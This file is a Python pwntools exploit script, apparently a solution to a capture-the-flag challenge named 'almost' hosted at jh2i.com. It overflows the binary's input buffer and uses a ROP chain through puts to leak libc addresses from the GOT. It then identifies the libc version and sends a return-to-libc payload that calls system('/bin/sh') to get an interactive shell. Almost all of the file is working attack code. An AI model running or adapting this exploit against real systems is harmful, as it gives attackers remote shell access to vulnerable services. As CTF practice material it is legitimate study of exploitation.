from pwn import *
import sys

#context.terminal =  ['tmux', 'splitw', '-v']

_FILE = "./almost"

if len(sys.argv) > 1:
    p = remote("jh2i.com", 50017)
else:
    p = process(_FILE)
    gdb.attach(p.pid)

binary = ELF(_FILE, checksec=False)

rop = ROP(binary)


__libc_start_main = binary.got["__libc_start_main"]
_getchar = binary.got["getchar"]
main = binary.sym["main"]

# resolve got plt tables

p.recvuntil(":")
p.sendline("https")
p.clean()
p.sendline("0x539.co")
p.clean()
p.sendline("contact")
p.clean()
p.sendline("y")

def leak_addr(p, got_func):
    payload = b"B"*64 #618)

    p.recvuntil(":")
    p.sendline(payload)

    payload = b"A"*64 #1236)

    p.recvuntil(":")
    p.sendline(payload)

    p.clean()

    payload = b"C"*(10)

    payload += p32(binary.plt['puts'])
    payload += p32(main)
    payload += p32(binary.got[got_func])
    payload += b"D"*(63-len(payload))
    p.sendline(payload)
    
    p.recvuntil("DDDD\n")
    leak = u32(p.recvline()[:4])
    log.info(f"{got_func}@plt {str(hex(leak))}")
    return leak, p

def exploit(p, libc):
    payload = b"F"*64 #618)

    p.recvuntil(":")
    p.sendline(payload)

    payload = b"G"*64 #1236)

    p.recvuntil(":")
    p.sendline(payload)

    p.clean()

    payload = b"H"*(10)

    payload += p32(libc.sym["system"])
    payload += p32(0x10101010)
    payload += p32(next(libc.search(b"/bin/sh")))
    payload += b"I"*(63-len(payload))
    p.sendline(payload)
 

    p.interactive()


_libc_puts, p = leak_addr(p, "puts")
_libc_scanf, p = leak_addr(p, "__isoc99_scanf")

# using https://libc.blukat.me/
print("go get libc (using https://libc.blukat.me) and put it in the same path.")

_libc_file = input("gimme libc path: ").strip()
_libc_file = _libc_file if len(_libc_file)>0 else "libc6-i386_2.30-8_amd64.so" if len(sys.argv)<=1 else "libc6-i386_2.27-3ubuntu1.2_amd64.so"
_libc = ELF(_libc_file, checksec=False)

_libc.address = _libc.address + (_libc_scanf - _libc.sym["__isoc99_scanf"])

if (_libc_puts != _libc.sym["puts"]): exit()

log.info(f"Libc Address: {hex(_libc.address)}")

exploit(p, _libc)


